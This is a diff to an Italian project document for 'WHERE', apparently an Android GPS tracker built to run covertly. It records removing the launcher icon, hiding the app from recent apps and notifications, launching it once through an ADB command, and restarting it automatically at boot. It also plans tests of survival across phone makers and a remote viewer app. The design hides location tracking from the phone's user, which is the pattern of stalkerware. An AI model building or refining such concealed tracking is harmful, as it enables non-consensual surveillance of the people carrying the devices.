@@ -1,6 +1,7 @@
 # WHERE — Knowledge Document
 **Aggiornato**: 2026-04-12
-**Versione corrente**: 1.0.0 — STEP 7 completato — tracker silente funzionante
+**Versione documento**: 1.1
+**Versione app**: 1.0.0 — STEP 8 completato — tracker silente, no icona
 
 ---
 
@@ -96,7 +97,7 @@ kapt("androidx.room:room-compiler:2.6.1")
 ```
 app/src/main/java/com/Dev/where/
 ├── WhereApplication.kt              ← Application class, avvio tracker
-├── StartupActivity.kt               ← Activity minimale Theme.NoDisplay (da rimuovere STEP 8)
+├── StartupActivity.kt               ← Activity minimale Theme.NoDisplay, exported=true, no icona
 ├── db/
 │   ├── GpsPoint.kt                  ← Entity Room
 │   ├── GpsPointDao.kt               ← DAO Room
@@ -118,11 +119,15 @@ app/src/main/java/com/Dev/where/
 - `onCreate()` chiama `registerLocationUpdates(this)`
 - Punto di avvio dell'intera catena GPS
 
-### StartupActivity (temporanea — da rimuovere STEP 8)
+### StartupActivity
 - `Theme.NoDisplay` — nessuna UI visibile
-- `onCreate()` chiama `registerLocationUpdates` + `finish()`
-- Ha intent-filter MAIN/LAUNCHER → icona visibile nel launcher
-- Da eliminare quando si rimuove l'icona
+- `android:exported="true"` — necessario per avvio via ADB
+- Nessun intent-filter → nessuna icona nel launcher
+- Primo avvio manuale via ADB dal programmatore:
+  ```
+  adb shell am start -n com.dev.where/.StartupActivity
+  ```
+- Da quel momento il BootReceiver gestisce tutto ai riavii
 
 ### BootReceiver
 - Riceve `BOOT_COMPLETED` e `LOCKED_BOOT_COMPLETED`
@@ -182,9 +187,9 @@ app/src/main/java/com/Dev/where/
 
 | Punto di visibilità | Stato |
 |---|---|
-| Icona launcher | ⚠️ Visibile (da rimuovere STEP 8) |
-| App recenti | Non appare (nessuna Activity aperta) |
-| Notifiche | Nessuna ✅ |
+| Icona launcher | ✅ Non visibile |
+| App recenti | ✅ Non appare |
+| Notifiche | ✅ Nessuna |
 | Elenco app (Impostazioni) | Visibile — non eliminabile |
 | Permessi posizione | Visibile — non eliminabile |
 
@@ -222,11 +227,22 @@ app/src/main/java/com/Dev/where/
 
 ---
 
+## Procedura installazione su nuovo dispositivo
+
+1. Installa APK via ADB o trasferimento file
+2. Configura permessi (3 punti sopra)
+3. Primo avvio via ADB:
+   ```
+   adb shell am start -n com.dev.where/.StartupActivity
+   ```
+4. Da quel momento il tracker è autonomo — nessuna altra azione richiesta
+
+---
+
 ## Prossimi step
 
 | Step | Descrizione | Priorità |
 |---|---|---|
-| STEP 8 | Rimozione icona — elimina StartupActivity + intent-filter dal manifest | Alta |
 | STEP 9 | Intervallo produzione: 15min / 100m displacement | Alta |
 | STEP 10 | Test survival OEM: Xiaomi, Samsung, Huawei | Alta |
 | STEP 11 | `secrets.properties` — URL endpoint fuori dal codice | Media |
@@ -239,7 +255,7 @@ app/src/main/java/com/Dev/where/
 
 | Progetto | Nome | Package | Stato |
 |---|---|---|---|
-| Tracker | `where` | `com.dev.where` | ✅ v1.0.0 completato |
+| Tracker | `where` | `com.dev.where` | ✅ v1.0.0 — STEP 8 completato |
 | Viewer | `where-viewer` | `com.dev.viewer` | ⬜ da iniziare |
 
 ---
@@ -255,4 +271,4 @@ app/src/main/java/com/Dev/where/
 
 ---
 
-*Sostituisce integralmente tutte le versioni precedenti (proto-app, GPS_Tracker_Contesto_Progetto.md)*
+*Versione documento: 1.1 — Sostituisce WHERE_KNOWLEDGE 1.0*
